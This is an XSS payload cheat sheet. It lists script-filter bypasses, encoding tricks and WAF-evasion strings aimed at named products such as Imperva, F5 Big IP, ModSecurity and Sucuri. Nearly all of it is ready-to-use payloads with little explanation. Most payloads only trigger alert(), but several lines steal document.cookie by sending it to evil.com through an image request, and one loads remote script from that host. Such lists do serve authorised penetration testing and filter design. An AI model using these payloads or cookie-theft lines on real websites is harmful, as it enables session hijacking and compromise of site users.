# _xss_payloads_

#_Cross-Site Scripting (XSS) Cheatsheet siii a si como te gusta _

#_XSS Locators:_

    '';!--"<XSS>=&{()}

#_Classic Payloads:_

    <svg onload=alert(1)>
    "><svg onload=alert(1)>
    <iframe src="javascript:alert(1)">
    "><script src=data:&comma;alert(1)//

#_script tag filter bypass:_

    <svg/onload=alert(1)>
    <script>alert(1)</script>
    <script     >alert(1)</script>
    <ScRipT>alert(1)</sCriPt>
    <%00script>alert(1)</script>
    <script>al%00ert(1)</script>

#_HTML tags:_

    <img/src=x a='' onerror=alert(1)>
    <IMG """><SCRIPT>alert(1)</SCRIPT>">
    <img src=`x`onerror=alert(1)>
    <img src='/' onerror='alert("kalisa")'>
    <IMG SRC=# onmouseover="alert('xxs')">
    <IMG SRC= onmouseover="alert('xxs')">
    <IMG onmouseover="alert('xxs')">
    <BODY ONLOAD=alert('XSS')>
    <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
    <SCRIPT SRC=http:/evil.com/xss.js?< B >
    "><XSS<test accesskey=x onclick=alert(1)//test
    <svg><discard onbegin=alert(1)>
    <script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
    <script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>

#_Other tags:_

    <BASE HREF="javascript:alert('XSS');//">
    <DIV STYLE="width: expression(alert('XSS'));">
    <TABLE BACKGROUND="javascript:alert('XSS')">
    <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
    <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
    <xss id=x tabindex=1 onactivate=alert(1)></xss>
    <xss onclick="alert(1)">test</xss>
    <xss onmousedown="alert(1)">test</xss>
    <body onresize=alert(1)>”onload=this.style.width=‘100px’>
    <xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>

#_CharCode:_
    
    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

#_if the input is already in script tag:_

    @domain.com">user+'-alert`1`-'@domain.com

#_AngularJS:_

    toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)

#_Scriptless:_

    <link rel=icon href="//evil?
    <iframe src="//evil?
    <iframe src="//evil?
    <input type=hidden type=image src="//evil?

#_Unclosed Tags:_

    <svg onload=alert(1)//

#_DOM XSS:_

    “><svg onload=alert(1)>
    <img src=1 onerror=alert(1)>
    javascript:alert(document.cookie)
    \“-alert(1)}//
    <><img src=1 onerror=alert(1)>

#_Another case:_

    param=abc`;return+false});});alert`xss`;</script>
    abc`; Finish the string
    return+false}); Finish the jQuery click function
    }); Finish the jQuery ready function
    alert`xss`; Here we can execute our code
    </script> This closes the script tag to prevent JavaScript parsing errors

# _Restrictions Bypass_

#_No parentheses:_

    <script>onerror=alert;throw 1</script>
    <script>throw onerror=eval,'=alert\x281\x29'</script>
    <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
    <script>location='javascript:alert\x281\x29'</script>
    <script>alert`1`</script>
    <script>new Function`X${document.location.hash.substr`1`}`</script>

#_No parentheses and no semicolons:_

    <script>{onerror=alert}throw 1</script>
    <script>throw onerror=alert,1</script>
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>

#_No parentheses and no spaces:_

    <script>Function`X${document.location.hash.substr`1`}```</script>

#_Angle brackets HTML encoded (in an attribute):_

    “onmouseover=“alert(1)
    ‘-alert(1)-’

#_If quote is escaped:_

    ‘}alert(1);{‘
    ‘}alert(1)%0A{‘
    \’}alert(1);{//

#_Embedded tab, newline, carriage return to break up XSS:_

    <IMG SRC="jav&#x09;ascript:alert('XSS');">
    <IMG SRC="jav&#x0A;ascript:alert('XSS');">
    <IMG SRC="jav&#x0D;ascript:alert('XSS');">

#_Other:_

    <svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)

# _Encoding_

#_Unicode:_

    <script>\u0061lert(1)</script>
    <script>\u{61}lert(1)</script>
    <script>\u{0000000061}lert(1)</script>

#_Hex:_

    <script>eval('\x61lert(1)')</script>

#_HTML:_

    <svg><script>&#97;lert(1)</script></svg>
    <svg><script>&#x61;lert(1)</script></svg>
    <svg><script>alert&NewLine;(1)</script></svg>
    <svg><script>x="&quot;,alert(1)//";</script></svg>
    \’-alert(1)//

#_URL:_

    <a href="javascript:x='%27-alert(1)-%27';">XSS</a>

#_Double URL Encode:_

    %253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
    %2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E

#_Unicode + HTML:_

    <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

#_HTML + URL:_

    <iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>

# _WAF Bypass_

#_Imperva Incapsula:_

    %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
    <img/src="x"/onerror="[JS-F**K Payload]">
    <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>

#_WebKnight:_

    <details ontoggle=alert(1)>
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

#_F5 Big IP:_

    <body style="height:1000px" onwheel="[DATA]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
    <body style="height:1000px" onwheel="[JS-F**k Payload]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
    <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

#_Barracuda WAF:_

    <body style="height:1000px" onwheel="alert(1)">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

#_PHP-IDS:_

    <svg+onload=+"[DATA]"
    <svg+onload=+"aler%25%37%34(1)"

#_Mod-Security:_

    <a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
    <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

#_Quick Defense:_

    <input type="search" onsearch="aler\u0074(1)">
    <details ontoggle="aler\u0074(1)">

#_Sucuri WAF:_

    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
